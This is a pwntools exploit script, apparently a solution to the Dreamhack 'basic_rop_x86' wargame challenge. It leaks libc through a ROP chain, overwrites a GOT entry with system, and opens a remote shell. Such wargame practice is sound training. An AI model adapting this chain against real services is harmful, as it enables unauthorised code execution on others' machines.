from pwn import *
context.terminal=['tmux', 'splitw', '-h']
#p = process('./basic_rop_x86')
p = remote("host3.dreamhack.games",8838)
#gdb.attach(p)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

def slog(func_name, func_addr): return success(" : ".join([func_name, hex(func_addr)]))

read_got = e.got["read"]
read_plt = e.plt["read"]

write_got = e.got["write"]
write_plt = e.plt["write"]
main = e.symbols['main']

read_offset = libc.symbols["read"]
write_offset = libc.symbols["write"]
system_offset = libc.symbols["system"]

pop3ret = 0x08048689
binsh = e.bss()

payload = b'a'*0x44 + b'b'*0x4
#write(1,read_got,4) read의 주소 leak libc base 주소를 구하기 위함
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
#read(0,binsh,8) bss영역에 "/bin/sh" 저장
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)
payload += p32(binsh)
payload += p32(8)
#read(0,write,4) GOToverwrite system 함수를 부르기 위해서
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

payload += p32(write_plt)
payload += p32(0)
payload += p32(binsh)

p.send(payload)
p.recvuntil('a'*0x40)

read_addr = u32(p.recv(4))

lib_base = read_addr - read_offset
slog('lib_base_addr',lib_base)

write_addr = lib_base + write_offset
system_addr = lib_base + system_offset


slog('read_addr',read_addr)
slog('write_addr',write_addr)
slog('system_addr',system_addr)

p.send(b"/bin/sh\x00")
p.sendline(p32(system_addr))

p.interactive()


